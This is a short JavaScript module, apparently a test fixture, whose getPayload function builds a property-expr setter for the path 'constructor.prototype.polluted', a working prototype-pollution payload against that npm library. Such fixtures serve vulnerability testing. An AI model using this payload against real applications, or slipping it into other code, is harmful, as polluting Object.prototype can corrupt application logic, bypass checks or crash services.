function getPayload() {
    let expr = require("property-expr");
    return {
        obj: {},
        setterCall: expr.setter("constructor.prototype.polluted")
    };
}

module.exports = { getPayload };